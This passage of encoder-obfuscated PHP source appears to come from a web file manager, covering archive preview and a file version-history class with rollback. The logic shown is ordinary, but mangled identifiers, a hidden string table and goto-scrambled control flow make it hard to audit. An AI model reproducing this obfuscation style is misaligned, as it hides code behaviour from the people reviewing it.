$F±«¹¢­ØÆ = $dƒøáæ‹„»[$AÖÏÉÈ†Ç[76]]; $bƒßãİ³Š = isset($dƒøáæ‹„»[$AÖÏÉÈ†Ç[1098]]) ? $dƒøáæ‹„»[$AÖÏÉÈ†Ç[1098]] : -1; goto E¶Ïˆ©¾”; E¶Ïˆ©¾”: $CˆÔ¼†ø–• = 50000; if (request_url_safe($F±«¹¢­ØÆ)) { $c”¥áÑŞ”¤ = parse_url_query($F±«¹¢­ØÆ); if (!isset($c”¥áÑŞ”¤[$AÖÏÉÈ†Ç[76]])) { show_json($AÖÏÉÈ†Ç[1099], !1); } } $E³×Ò´ì„Ô = isset($c”¥áÑŞ”¤) ? $c”¥áÑŞ”¤[$AÖÏÉÈ†Ç[76]] : $F±«¹¢­ØÆ; goto BØ¢£Ì  ; A‚Çšˆˆ: if (isset($c”¥áÑŞ”¤)) { $B‘À§½Ñ–È = array($c”¥áÑŞ”¤[$AÖÏÉÈ†Ç[76]], $c”¥áÑŞ”¤[$AÖÏÉÈ†Ç[1098]], $c”¥áÑŞ”¤[$AÖÏÉÈ†Ç[28]]); $eõØÌÚÄğ = md5(implode($AÖÏÉÈ†Ç[71], $B‘À§½Ñ–È)) . $AÖÏÉÈ†Ç[95] . get_path_ext($c”¥áÑŞ”¤[$AÖÏÉÈ†Ç[28]]); } else { $B‘À§½Ñ–È = array($eÏğ‹“¹Š³[$AÖÏÉÈ†Ç[28]], $eÏğ‹“¹Š³[$AÖÏÉÈ†Ç[76]], $eÏğ‹“¹Š³[$AÖÏÉÈ†Ç[78]]); $eõØÌÚÄğ = md5(implode($AÖÏÉÈ†Ç[71], $B‘À§½Ñ–È)) . $AÖÏÉÈ†Ç[95] . $e×¿Ì«Ô; } if ($bƒßãİ³Š == -1) { $AÒøÜíáµ¢ = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\x56\151\145\x77\x2f{$dô¢¿ñÆÈ”}\57{$eõØÌÚÄğ}\56\154\x6f\x67"; $aÅ¨¾½‰Š = self::infoFull($AÒøÜíáµ¢); if ($aÅ¨¾½‰Š) { $AÒøÜíáµ¢ = $aÅ¨¾½‰Š[$AÖÏÉÈ†Ç[76]]; $aÛŸœ»Ø‹ç = self::getContent($AÒøÜíáµ¢); if ($aÛŸœ»Ø‹ç) { $A ßÚÆÅå = json_decode($aÛŸœ»Ø‹ç, !0); if (count($A ßÚÆÅå) >= $CˆÔ¼†ø–•) { show_json(sprintf(LNG($AÖÏÉÈ†Ç[1100]), count($A ßÚÆÅå)), !1); } return $A ßÚÆÅå; } } else { $AÒøÜíáµ¢ = self::mkfile($AÒøÜíáµ¢); } } $AÒÛå”‚Ãù = TEMP_FILES . $dô¢¿ñÆÈ”; goto FŒ–™©å; E×ÌÖ¹ñÁ: $A ßÚÆÅå = json_encode($E±‚ùŸ§î[$AÖÏÉÈ†Ç[1096]]); self::setContent($AÒøÜíáµ¢, $A ßÚÆÅå); if (count($E±‚ùŸ§î[$AÖÏÉÈ†Ç[1096]]) >= $CˆÔ¼†ø–•) { show_json(sprintf(LNG($AÖÏÉÈ†Ç[1100]), count($E±‚ùŸ§î[$AÖÏÉÈ†Ç[1096]])), !1); } goto c»”Šòª…; dÓˆå¢Ëˆ: $eËĞ±ÓåŒ = self::iconvSystem($eËĞ±ÓåŒ); if ($bƒßãİ³Š >= 0) { $dÚù±Ë²‡ = isset($dƒøáæ‹„»[$AÖÏÉÈ†Ç[1102]]) ? $dƒøáæ‹„»[$AÖÏÉÈ†Ç[1102]] : !1; $a‰Í…‘Ìª = isset($dƒøáæ‹„»[$AÖÏÉÈ†Ç[28]]) ? $dƒøáæ‹„»[$AÖÏÉÈ†Ç[28]] : $AÖÏÉÈ†Ç[33]; KodArchive::filePreview($eËĞ±ÓåŒ, $bƒßãİ³Š, $dÚù±Ë²‡, $a‰Í…‘Ìª); self::archiveExt(); die; } $E±‚ùŸ§î = KodArchive::listContent($eËĞ±ÓåŒ); goto E°ÚèÖö; E°ÚèÖö: self::archiveExt(); del_dir($AÒÛå”‚Ãù); if (!$E±‚ùŸ§î[$AÖÏÉÈ†Ç[1094]]) { show_json($E±‚ùŸ§î[$AÖÏÉÈ†Ç[1096]], !1); } goto E×ÌÖ¹ñÁ; c»”Šòª…: return $E±‚ùŸ§î[$AÖÏÉÈ†Ç[1096]]; goto FŒ•†õƒ§; FŒ–™©å: if (!is_dir($AÒÛå”‚Ãù)) { mk_dir($AÒÛå”‚Ãù); } $eËĞ±ÓåŒ = $AÒÛå”‚Ãù . $AÖÏÉÈ†Ç[8] . $eõØÌÚÄğ; if (!@file_exists(self::iconvSystem($eËĞ±ÓåŒ))) { if (isset($c”¥áÑŞ”¤)) { url_request($F±«¹¢­ØÆ, $AÖÏÉÈ†Ç[1101], $eËĞ±ÓåŒ); } else { $E©Ÿƒ¾ø‘Ã = self::localFilePath($F±«¹¢­ØÆ, $e×¿Ì«Ô); $eËĞ±ÓåŒ = $E©Ÿƒ¾ø‘Ã ? $E©Ÿƒ¾ø‘Ã : self::download($F±«¹¢­ØÆ, $eËĞ±ÓåŒ); } } goto dÓˆå¢Ëˆ; FŒ•†õƒ§: } private static function fileExt($fÂÄÑ¹ÆÕ) { $eç´ÛéÀËò =& $_SERVER[úÉ·öƒÑì©]; $E®Ú‹ÔË‹ù = $fÂÄÑ¹ÆÕ[$eç´ÛéÀËò[168]]; if ($E®Ú‹ÔË‹ù == $eç´ÛéÀËò[1103]) { $e‹¥õ‰ßš± = $eç´ÛéÀËò[1104]; if (substr($fÂÄÑ¹ÆÕ[$eç´ÛéÀËò[28]], -strlen($e‹¥õ‰ßš±)) == $e‹¥õ‰ßš±) { $E®Ú‹ÔË‹ù = $eç´ÛéÀËò[1105]; } } self::archiveExt($E®Ú‹ÔË‹ù); return $E®Ú‹ÔË‹ù; } private static function zipFileList($Aºæ»…Ôå, $BŒœœÅ—ìó = false) { $d”ŸÁ¿Œ =& $_SERVER[úÉ·öƒÑì©]; $fí—ªö‰ = array(); foreach ($Aºæ»…Ôå as $F­‡Ú¢êî¢) { $FÉë’¢¯ÀÌ = $F­‡Ú¢êî¢[$d”ŸÁ¿Œ[76]]; if ($BŒœœÅ—ìó) { $FÉë’¢¯ÀÌ = self::copy($F­‡Ú¢êî¢[$d”ŸÁ¿Œ[76]], $BŒœœÅ—ìó, $d”ŸÁ¿Œ[799]); } else { $D×ĞêÁ˜ˆ× = self::init($F­‡Ú¢êî¢[$d”ŸÁ¿Œ[76]]); if ($D×ĞêÁ˜ˆ×->getType() == $d”ŸÁ¿Œ[106]) { $FÉë’¢¯ÀÌ = $D×ĞêÁ˜ˆ×->path; } } if ($FÉë’¢¯ÀÌ && self::local()->exist($FÉë’¢¯ÀÌ)) { $fí—ªö‰[$F­‡Ú¢êî¢[$d”ŸÁ¿Œ[76]]] = $FÉë’¢¯ÀÌ; } } if (!empty($fí—ªö‰)) { return array_values($fí—ªö‰); } show_json(LNG($d”ŸÁ¿Œ[1069]), !1); } public static function tmpFileName($AòãÂô¦ƒÄ) { $C·­ÑõÃ‹¸ =& $_SERVER[úÉ·öƒÑì©]; $føô³ØªÕ = array($AòãÂô¦ƒÄ[$C·­ÑõÃ‹¸[28]], $AòãÂô¦ƒÄ[$C·­ÑõÃ‹¸[76]], $AòãÂô¦ƒÄ[$C·­ÑõÃ‹¸[78]], $AòãÂô¦ƒÄ[$C·­ÑõÃ‹¸[496]]); return md5(implode($C·­ÑõÃ‹¸[71], $føô³ØªÕ)); } private static function localFilePath($eä‘œ‚Æè, $DãÌ¡Ä†Çá) { goto e½ôĞäê‰‚; e½ôĞäê‰‚: $aë±´Ê‚ =& $_SERVER[úÉ·öƒÑì©]; if ($DãÌ¡Ä†Çá == $aë±´Ê‚[1106] && strtoupper(substr(PHP_OS, 0, 3)) == $aë±´Ê‚[1107]) { return !1; } $FÁÜ»İàİ¬ = KodIO::parse($eä‘œ‚Æè); goto eÄÖç¹¿Ì; dŞñ§İØ’·: if ($Eëœ®ÎãÙÅ == $aë±´Ê‚[106] || $Eëœ®ÎãÙÅ == $aë±´Ê‚[1109]) { if (!$aéõ©«…í¯->exist($aéõ©«…í¯->path)) { show_json(LNG($aë±´Ê‚[105]), !1); } return $aéõ©«…í¯->path; } return !1; goto BÊ†¥šŸªÔ; eÄÖç¹¿Ì: if ($FÁÜ»İàİ¬[$aë±´Ê‚[29]] == KodIO::KOD_SOURCE) { $A…‰¨¼‘ÇŠ = Model($aë±´Ê‚[806])->fileInfoGet(KodIO::sourceID($eä‘œ‚Æè)); if (!$A…‰¨¼‘ÇŠ[$aë±´Ê‚[76]]) { show_json($aë±´Ê‚[1108], !1); } $eä‘œ‚Æè = $A…‰¨¼‘ÇŠ[$aë±´Ê‚[76]]; } $aéõ©«…í¯ = self::init($eä‘œ‚Æè); $Eëœ®ÎãÙÅ = $aéõ©«…í¯->getType(); goto dŞñ§İØ’·; BÊ†¥šŸªÔ: } private static function archiveExt($BÜÀ¿Ê×‘‡ = '') { $GLOBALS[$_SERVER[úÉ·öƒÑì©][1110]] = $BÜÀ¿Ê×‘‡; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto BêêâÇÙ¦ò; BêêâÇÙ¦ò: $E¬ôÊ¡£Õ¹ =& $_SERVER[úÉ·öƒÑì©]; $F¸İ—•œ„½ = $GLOBALS[$E¬ôÊ¡£Õ¹[6]][$E¬ôÊ¡£Õ¹[88]]; if ($F¸İ—•œ„½[$E¬ôÊ¡£Õ¹[1111]] != 1) { return; } goto DÙ©‡»¡âÊ; DÙ©‡»¡âÊ: if ($F¸İ—•œ„½[$E¬ôÊ¡£Õ¹[1112]] <= 0) { return; } if (isset($_REQUEST[$E¬ôÊ¡£Õ¹[1113]]) && $_REQUEST[$E¬ôÊ¡£Õ¹[1113]] == $E¬ôÊ¡£Õ¹[87]) { return; } Hook::bind($E¬ôÊ¡£Õ¹[1114], $E¬ôÊ¡£Õ¹[1115]); goto F¯·²‡÷ß”; B“¨‰ÖÓ: Hook::bind($E¬ôÊ¡£Õ¹[1122], $E¬ôÊ¡£Õ¹[1123]); Hook::bind($E¬ôÊ¡£Õ¹[1124], $E¬ôÊ¡£Õ¹[1125]); goto d¿ã…·õ‚; F¯·²‡÷ß”: Hook::bind($E¬ôÊ¡£Õ¹[1116], $E¬ôÊ¡£Õ¹[1117]); Hook::bind($E¬ôÊ¡£Õ¹[1118], $E¬ôÊ¡£Õ¹[1119]); Hook::bind($E¬ôÊ¡£Õ¹[1120], $E¬ôÊ¡£Õ¹[1121]); goto B“¨‰ÖÓ; d¿ã…·õ‚: } public static function eventBeforeUpload($Cª¹ÔªˆÓ) { if ($Cª¹ÔªˆÓ[3] && $Cª¹ÔªˆÓ[3] != REPEAT_REPLACE) { return; } $AÓŠ„ØğÓº = self::parsePath($Cª¹ÔªˆÓ[0]); if (!$AÓŠ„ØğÓº) { return; } self::add($AÓŠ„ØğÓº); } public static function eventBeforeEdit($cˆØ©îè´) { $EªœïÓÎ«¤ = self::parsePath($cˆØ©îè´[0]); if (!$EªœïÓÎ«¤) { return; } self::add($EªœïÓÎ«¤); } public static function eventBeforeCopyFile($e„£¬¹¹ç, $CÓ‹÷ÉÓ„®, $BÓ†²ÂÚÔ, $FÈéƒ¬º, $Aº¡ùáàÕ, $aÖÕ§çğÜ) { $bÊ±‘Áçõ = $BÓ†²ÂÚÔ->getPathOuter($FÈéƒ¬º); $d–£ÉºÊÏØ = self::parsePath($bÊ±‘Áçõ); if (!$d–£ÉºÊÏØ) { return; } self::add($d–£ÉºÊÏØ); } public static function eventBeforeRename($B¼Î†ìªŸ‚) { $dÊ‘¢Ş„‘  =& $_SERVER[úÉ·öƒÑì©]; $DğëÚƒ‚‘ğ = self::parsePath($B¼Î†ìªŸ‚[0]); if (!$DğëÚƒ‚‘ğ) { return; } $cˆÃ‚ò“­Ë = self::checkInHistory($DğëÚƒ‚‘ğ); if (!$cˆÃ‚ò“­Ë) { return; } if ($cˆÃ‚ò“­Ë[$dÊ‘¢Ş„‘ [29]] == $dÊ‘¢Ş„‘ [193]) { $bëËˆ¤£Îõ = self::listData($DğëÚƒ‚‘ğ); if ($bëËˆ¤£Îõ && $bëËˆ¤£Îõ[$dÊ‘¢Ş„‘ [376]]) { self::moveHistory($DğëÚƒ‚‘ğ, $B¼Î†ìªŸ‚[1]); } } else { IO::rename($cˆÃ‚ò“­Ë[$dÊ‘¢Ş„‘ [76]], $B¼Î†ìªŸ‚[1]); } } public static function eventBeforeMove($a…Ë™ÅÖ¶ö) { goto C¯–Ş¤©í”; C¯–Ş¤©í”: $cˆèáã‡¯è =& $_SERVER[úÉ·öƒÑì©]; $d¾ÔŠÎ‹¡ = self::parsePath($a…Ë™ÅÖ¶ö[0]); if (!$d¾ÔŠÎ‹¡) { return; } goto Eà…éÌŸñ•; bÚõ´¹ã: if ($E ƒ‚¬­•ˆ[$cˆèáã‡¯è[29]] == $cˆèáã‡¯è[193]) { $e÷ˆöƒ»Å¹ = self::listData($d¾ÔŠÎ‹¡); $Bò¡¼…Ì‘ = rtrim($F¡àÔİÜÔƒ, $cˆèáã‡¯è[8]) . $cˆèáã‡¯è[8] . ($f™…ñ†¨·Û ? $f™…ñ†¨·Û : get_path_this($d¾ÔŠÎ‹¡)); $aÄïƒïĞ‚ = self::listData($Bò¡¼…Ì‘); if ($e÷ˆöƒ»Å¹ && $e÷ˆöƒ»Å¹[$cˆèáã‡¯è[376]] && $aÄïƒïĞ‚ && $aÄïƒïĞ‚[$cˆèáã‡¯è[376]]) { return self::clear($d¾ÔŠÎ‹¡); } if ($e÷ˆöƒ»Å¹ && $e÷ˆöƒ»Å¹[$cˆèáã‡¯è[376]]) { self::moveHistory($d¾ÔŠÎ‹¡, $f™…ñ†¨·Û, $D‰ùÓçö‚); } } else { IO::move($E ƒ‚¬­•ˆ[$cˆèáã‡¯è[76]], $D‰ùÓçö‚, !1, $f™…ñ†¨·Û); self::clearEmptyFolder(IO::pathFather($E ƒ‚¬­•ˆ[$cˆèáã‡¯è[76]])); } goto fº‡ƒ¶¦; Eà…éÌŸñ•: $F¡àÔİÜÔƒ = self::parsePath($a…Ë™ÅÖ¶ö[1]); if (!$F¡àÔİÜÔƒ) { return; } $f™…ñ†¨·Û = $a…Ë™ÅÖ¶ö[3]; goto FÇëœí †; FÇëœí †: $E ƒ‚¬­•ˆ = self::checkInHistory($d¾ÔŠÎ‹¡); if (!$E ƒ‚¬­•ˆ) { return; } $D‰ùÓçö‚ = self::pathHistory($F¡àÔİÜÔƒ); goto bÚõ´¹ã; fº‡ƒ¶¦: } public static function eventAfterRemove($cõŒ¢ËÍ§ù, $fè»ì±³Íº) { goto a”…‘«¿¡Í; B‰Ã‹³œ¢: if ($bŞ“’¬[$fÊÃ¢ëÕÆ[29]] == $fÊÃ¢ëÕÆ[193]) { $eº……ŸĞĞß = self::listData($B½ç÷ñÂ¸…, !1); if ($eº……ŸĞĞß && $eº……ŸĞĞß[$fÊÃ¢ëÕÆ[376]]) { self::clear($B½ç÷ñÂ¸…, !1); } } else { IO::remove($bŞ“’¬[$fÊÃ¢ëÕÆ[76]]); self::clearEmptyFolder(IO::pathFather($bŞ“’¬[$fÊÃ¢ëÕÆ[76]])); } goto a…ààäŒÃË; e›µĞ¦‹²»: if (!$B½ç÷ñÂ¸…) { return; } $bŞ“’¬ = self::checkInHistory($B½ç÷ñÂ¸…); if (!$bŞ“’¬) { return; } goto B‰Ã‹³œ¢; a”…‘«¿¡Í: $fÊÃ¢ëÕÆ =& $_SERVER[úÉ·öƒÑì©]; if (!$fè»ì±³Íº) { return; } $B½ç÷ñÂ¸… = self::parsePath($cõŒ¢ËÍ§ù[0]); goto e›µĞ¦‹²»; a…ààäŒÃË: } private static function checkInHistory($c¬‰‘«Şæ³) { $eÔØà®òø = self::pathHistory($c¬‰‘«Şæ³); if (!IO::exist($eÔØà®òø)) { $eÔØà®òø .= $_SERVER[úÉ·öƒÑì©][1126]; } return IO::exist($eÔØà®òø) ? IO::info($eÔØà®òø) : !1; } private static function parsePath($Dè²Ğ…ªçß) { goto F†ƒœ¢çéÈ; D¶¡Å‡¼Î: if (!$b‚“áÕ¦ÚĞ || !$aæÍ•‡›…Ü[$f¿Åîß³—[1128]]) { return !1; } if ($D¢÷ÒíÎŠ‰ == KodIO::KOD_SHARE_ITEM) { $FŠã‘’ÕïÚ = IO::init($Dè²Ğ…ªçß); if ($FŠã‘’ÕïÚ->pathParse[$f¿Åîß³—[1056]]) { return self::parsePath($FŠã‘’ÕïÚ->pathParse[$f¿Åîß³—[1056]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto FÁÙ½óÕ˜; F†ƒœ¢çéÈ: $f¿Åîß³— =& $_SERVER[úÉ·öƒÑì©]; if (!$Dè²Ğ…ªçß) { return !1; } if ($GLOBALS[$f¿Åîß³—[1127]]) { return; } goto bÂàÖï±ÍÊ; FÁÙ½óÕ˜: $Fª¸í„ÈàØ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $f¿Åîß³—[1129]); foreach ($Fª¸í„ÈàØ as $B¦–ÃäçÅ) { if (!$D¢÷ÒíÎŠ‰ && substr($Dè²Ğ…ªçß, 0, strlen($B¦–ÃäçÅ)) == $B¦–ÃäçÅ) { return !1; } } self::log($GLOBALS[$f¿Åîß³—[1051]] . $f¿Åîß³—[1130] . $Dè²Ğ…ªçß); goto CØÑªØÊÌù; CØÑªØÊÌù: return $Dè²Ğ…ªçß; goto cÌ¨¿¶±¯Ş; bÂàÖï±ÍÊ: $aæÍ•‡›…Ü = KodIO::parse($Dè²Ğ…ªçß); $D¢÷ÒíÎŠ‰ = $aæÍ•‡›…Ü[$f¿Åîß³—[29]]; $b‚“áÕ¦ÚĞ = !$D¢÷ÒíÎŠ‰ || $D¢÷ÒíÎŠ‰ == KodIO::KOD_IO || $D¢÷ÒíÎŠ‰ == KodIO::KOD_SHARE_ITEM; goto D¶¡Å‡¼Î; cÌ¨¿¶±¯Ş: } private static function pathHistory($B¬ğÄ—í©) { $D¹†…Ğàä¼ =& $_SERVER[úÉ·öƒÑì©]; $eÁÓ…‰áò = self::$_historyBase . ltrim(KodIO::clear($B¬ğÄ—í©), $D¹†…Ğàä¼[8]); $eÁÓ…‰áò = str_replace(array($D¹†…Ğàä¼[1131]), array($D¹†…Ğàä¼[1132]), $eÁÓ…‰áò); return $eÁÓ…‰áò; } public static function log($Fù§™™Ì¨—) { } public static function historyCount($a„øº¹„£) { $BÁ½èå–å =& $_SERVER[úÉ·öƒÑì©]; $FŞªùô´Ô· = array(); $e•Ò‰ŞÉˆ² = array(); foreach ($a„øº¹„£ as $Dá˜¨«Ã‘Š) { $D»À¯ùÂ½ß = get_path_father($Dá˜¨«Ã‘Š); if (!$e•Ò‰ŞÉˆ²[$D»À¯ùÂ½ß]) { $e•Ò‰ŞÉˆ²[$D»À¯ùÂ½ß] = array(); } $e•Ò‰ŞÉˆ²[$D»À¯ùÂ½ß][] = get_path_this($Dá˜¨«Ã‘Š); } foreach ($e•Ò‰ŞÉˆ² as $D»À¯ùÂ½ß => $cÔÚ˜×†ç©) { $A†ˆŠÅ·‚ñ = self::parsePath($D»À¯ùÂ½ß); if (!$A†ˆŠÅ·‚ñ) { continue; } foreach ($cÔÚ˜×†ç© as $E¬»Á¹›êğ) { $d™‰ğŒùÇª = self::listData(rtrim($A†ˆŠÅ·‚ñ, $BÁ½èå–å[8]) . $BÁ½èå–å[8] . $E¬»Á¹›êğ, !1); if ($d™‰ğŒùÇª && $d™‰ğŒùÇª[$BÁ½èå–å[376]]) { $FŞªùô´Ô·[rtrim($D»À¯ùÂ½ß, $BÁ½èå–å[8]) . $BÁ½èå–å[8] . $E¬»Á¹›êğ] = count($d™‰ğŒùÇª[$BÁ½èå–å[376]]); } } } return $FŞªùô´Ô·; } public static function add($BÂœ˜¢–º) { goto DÛÉãÚòÄÊ; EÂµ£œ÷ì: $Fß¢ ºíŠ¤ = array($E¢Í¾¦èˆ[402] => $E†‘•Æ“¥‡, $E¢Í¾¦èˆ[171] => $CŒâ‡Â ˆ³, $E¢Í¾¦èˆ[28] => $CŸ¦‰²„à[$E¢Í¾¦èˆ[28]] . $E¢Í¾¦èˆ[95] . date($E¢Í¾¦èˆ[1135]) . rand_string(1), $E¢Í¾¦èˆ[78] => $CŸ¦‰²„à[$E¢Í¾¦èˆ[78]], $E¢Í¾¦èˆ[441] => USER_ID, $E¢Í¾¦èˆ[194] => time(), $E¢Í¾¦èˆ[1136] => $E¢Í¾¦èˆ[33]); IO::mkdir($Fñ™°ŞÔ±¬[$E¢Í¾¦èˆ[1137]]); $fÕ‰•øíÃò = IO::copy($BÂœ˜¢–º, $Fñ™°ŞÔ±¬[$E¢Í¾¦èˆ[1137]], !1, $Fß¢ ºíŠ¤[$E¢Í¾¦èˆ[28]]); goto dÄ¿ÜÍ…ïé; DÛÉãÚòÄÊ: $E¢Í¾¦èˆ =& $_SERVER[úÉ·öƒÑì©]; $Fñ™°ŞÔ±¬ = self::listData($BÂœ˜¢–º); if (!$Fñ™°ŞÔ±¬) { return; } goto F¼ÉõöËš¤; f¨…¾ò­: return self::saveData($Fñ™°ŞÔ±¬[$E¢Í¾¦èˆ[1138]], $a¤ºŠØˆÇƒ); goto EÂ„ˆ÷™¹¦; C¢–ÔÅ™: $a¤ºŠØˆÇƒ = $Fñ™°ŞÔ±¬[$E¢Í¾¦èˆ[376]]; if ($CŸ¦‰²„à[$E¢Í¾¦èˆ[78]] == 0) { return; } if ($CŸ¦‰²„à[$E¢Í¾¦èˆ[78]] >= 1024 * 1024 * 500) { return !1; } goto cœ¬½¾àŒ; dÄ¿ÜÍ…ïé: if (!$fÕ‰•øíÃò) { self::clearEmptyFolder($Fñ™°ŞÔ±¬[$E¢Í¾¦èˆ[1137]]); return !1; } array_unshift($a¤ºŠØˆÇƒ, $Fß¢ ºíŠ¤); if (count($a¤ºŠØˆÇƒ) > $EœÔ†Šƒ²Ş) { $dÌŒñ›ÏòŞ = array_slice($a¤ºŠØˆÇƒ, $EœÔ†Šƒ²Ş); foreach ($dÌŒñ›ÏòŞ as $FÆÛ„éøˆ) { IO::remove($Fñ™°ŞÔ±¬[$E¢Í¾¦èˆ[1137]] . $FÆÛ„éøˆ[$E¢Í¾¦èˆ[28]]); } $a¤ºŠØˆÇƒ = array_slice($a¤ºŠØˆÇƒ, 0, $EœÔ†Šƒ²Ş); } goto f¨…¾ò­; F¼ÉõöËš¤: $c°İĞÁ‰¸Ÿ = Model($E¢Í¾¦èˆ[746])->get($E¢Í¾¦èˆ[1133]); $D„éçìÒ½˜ = $GLOBALS[$E¢Í¾¦èˆ[6]][$E¢Í¾¦èˆ[88]][$E¢Í¾¦èˆ[1112]]; $EœÔ†Šƒ²Ş = $c°İĞÁ‰¸Ÿ == $E¢Í¾¦èˆ[1134] ? 5 : $D„éçìÒ½˜; goto câ†Ó‡ Ü; cœ¬½¾àŒ: if ($a¤ºŠØˆÇƒ && $a¤ºŠØˆÇƒ[0][$E¢Í¾¦èˆ[171]] == $CŒâ‡Â ˆ³) { return !0; } if (array_key_exists($E¢Í¾¦èˆ[196], $CŸ¦‰²„à) && !$CŸ¦‰²„à[$E¢Í¾¦èˆ[196]]) { return !1; } $E†‘•Æ“¥‡ = short_id(time()); goto EÂµ£œ÷ì; câ†Ó‡ Ü: if ($D„éçìÒ½˜ <= 0) { return; } $CŒâ‡Â ˆ³ = IO::hashSimple($BÂœ˜¢–º); $CŸ¦‰²„à = IO::info($BÂœ˜¢–º); goto C¢–ÔÅ™; EÂ„ˆ÷™¹¦: } public static function remove($Aé©íäÍîî, $B¢Œ‚èËíŒ) { $AÂùòĞçˆ” =& $_SERVER[úÉ·öƒÑì©]; $C¦¡„‘‰´Ö = self::listData($Aé©íäÍîî); $C”§©”ÃÙÕ = array(); if (!$C¦¡„‘‰´Ö) { return !1; } foreach ($C¦¡„‘‰´Ö[$AÂùòĞçˆ”[376]] as $Aà²ÎãŠ¶Ã) { if ($Aà²ÎãŠ¶Ã[$AÂùòĞçˆ”[402]] == $B¢Œ‚èËíŒ) { IO::remove($C¦¡„‘‰´Ö[$AÂùòĞçˆ”[1137]] . $Aà²ÎãŠ¶Ã[$AÂùòĞçˆ”[28]]); continue; } $C”§©”ÃÙÕ[] = $Aà²ÎãŠ¶Ã; } return self::saveData($C¦¡„‘‰´Ö[$AÂùòĞçˆ”[1138]], $C”§©”ÃÙÕ); } public static function clear($bà‹Õ·¥Ò¬, $CÖä×ÊùÎ = true) { $d¹èëªóÚ‰ =& $_SERVER[úÉ·öƒÑì©]; $c·‚Ç‚öõÕ = self::listData($bà‹Õ·¥Ò¬, $CÖä×ÊùÎ); if (!$c·‚Ç‚öõÕ) { return !1; } foreach ($c·‚Ç‚öõÕ[$d¹èëªóÚ‰[376]] as $B±ÑÑÇËö“) { IO::remove($c·‚Ç‚öõÕ[$d¹èëªóÚ‰[1137]] . $B±ÑÑÇËö“[$d¹èëªóÚ‰[28]]); } return self::saveData($c·‚Ç‚öõÕ[$d¹èëªóÚ‰[1138]], array()); } public static function moveHistory($cÏ¸¢á¬ñ, $e‚Ç½˜ù¦¸ = '', $C•òé¦õ–Ã = '') { goto e–ñÑ÷²®¢; d“»ëò„àò: $e¾’ë¢ºç = substr(get_path_this($Bè¶ã‘Ã­à[$còĞãˆ»¬î[1138]]), 0, -strlen($eï¦®Àãóç)); foreach ($Bè¶ã‘Ã­à[$còĞãˆ»¬î[376]] as $FÍëÅ‘£ => $CÜÍéöó†Ñ) { $bíåˆããÑô = $e‚Ç½˜ù¦¸ . substr($CÜÍéöó†Ñ[$còĞãˆ»¬î[28]], strlen($e¾’ë¢ºç)); $dîÉÄ¹å¢¶ = IO::move($Bè¶ã‘Ã­à[$còĞãˆ»¬î[1137]] . $CÜÍéöó†Ñ[$còĞãˆ»¬î[28]], $C•òé¦õ–Ã, !1, $bíåˆããÑô); if ($dîÉÄ¹å¢¶) { $Bè¶ã‘Ã­à[$còĞãˆ»¬î[376]][$FÍëÅ‘£][$còĞãˆ»¬î[28]] = $bíåˆããÑô; } } $Bè¶ã‘Ã­à[$còĞãˆ»¬î[1138]] = IO::move($Bè¶ã‘Ã­à[$còĞãˆ»¬î[1138]], $C•òé¦õ–Ã, !1, $e‚Ç½˜ù¦¸ . $eï¦®Àãóç); goto Dï¹š®¬’; e–ñÑ÷²®¢: $còĞãˆ»¬î =& $_SERVER[úÉ·öƒÑì©]; $Bè¶ã‘Ã­à = self::listData($cÏ¸¢á¬ñ, !1); if (!$Bè¶ã‘Ã­à || !$Bè¶ã‘Ã­à[$còĞãˆ»¬î[376]]) { return !1; } goto e®È˜ˆõ±Ÿ; Dï¹š®¬’: self::saveData($Bè¶ã‘Ã­à[$còĞãˆ»¬î[1138]], $Bè¶ã‘Ã­à[$còĞãˆ»¬î[376]]); self::clearEmptyFolder($Bè¶ã‘Ã­à[$còĞãˆ»¬î[1137]]); goto A¹²ç¡¤À ; e®È˜ˆõ±Ÿ: $eï¦®Àãóç = $còĞãˆ»¬î[1126]; $e‚Ç½˜ù¦¸ = $e‚Ç½˜ù¦¸ ? $e‚Ç½˜ù¦¸ : get_path_this($cÏ¸¢á¬ñ); $C•òé¦õ–Ã = $C•òé¦õ–Ã ? $C•òé¦õ–Ã : $Bè¶ã‘Ã­à[$còĞãˆ»¬î[1137]]; goto d“»ëò„àò; A¹²ç¡¤À : } public static function rollback($BÜÈ’Ÿä‹†, $Aˆ‚ö¹¹Áº) { $DíÒåçÖğ’ =& $_SERVER[úÉ·öƒÑì©]; $e…¡Êå”Ïã = self::listData($BÜÈ’Ÿä‹†); if (!$e…¡Êå”Ïã) { return; } $b©Õ˜œºğ¬ = IO::info($BÜÈ’Ÿä‹†); foreach ($e…¡Êå”Ïã[$DíÒåçÖğ’[376]] as $BçÆ±²‡¦Ï => $A‚×Š±Ï“–) { if ($A‚×Š±Ï“–[$DíÒåçÖğ’[402]] == $Aˆ‚ö¹¹Áº) { self::add($BÜÈ’Ÿä‹†); $AƒÑËâçµ‹ = $e…¡Êå”Ïã[$DíÒåçÖğ’[1137]] . $A‚×Š±Ï“–[$DíÒåçÖğ’[28]]; $CË¿ØÑ«î = IO::copy($AƒÑËâçµ‹, IO::pathFather($BÜÈ’Ÿä‹†), REPEAT_REPLACE, $b©Õ˜œºğ¬[$DíÒåçÖğ’[28]]); if ($CË¿ØÑ«î) { self::remove($BÜÈ’Ÿä‹†, $Aˆ‚ö¹¹Áº); } return $CË¿ØÑ«î; } } return !1; } public static function setDetail($dÙ‚ß÷ß†´, $fÔˆ°ƒÜÈ, $e¯–ÚÅ£øï) { $eÆºõÒßà‚ =& $_SERVER[úÉ·öƒÑì©]; $Eëã³ÄØ–‰ = self::listData($dÙ‚ß÷ß†´); if (!$Eëã³ÄØ–‰) { return; } foreach ($Eëã³ÄØ–‰[$eÆºõÒßà‚[376]] as $CÌ°ˆŸìå => $FÔÉ¿èØğ) { if ($FÔÉ¿èØğ[$eÆºõÒßà‚[402]] == $fÔˆ°ƒÜÈ) { $Eëã³ÄØ–‰[$eÆºõÒßà‚[376]][$CÌ°ˆŸìå][$eÆºõÒßà‚[1136]] = $e¯–ÚÅ£øï; self::saveData($Eëã³ÄØ–‰[$eÆºõÒßà‚[1138]], $Eëã³ÄØ–‰[$eÆºõÒßà‚[376]]); return !0; } } return !1; } public static function fileInfo($dÒô—äùó, $c½–óÈÅ¹) { goto dî‡Ÿ¸›×ß; f¢ªÜØğíÀ: $fÉ„óÔÓÈ† = $aïå¢òè¶[33]; foreach ($e•Üâààš„[$aïå¢òè¶[376]] as $F¦Ã†Ü°÷æ => 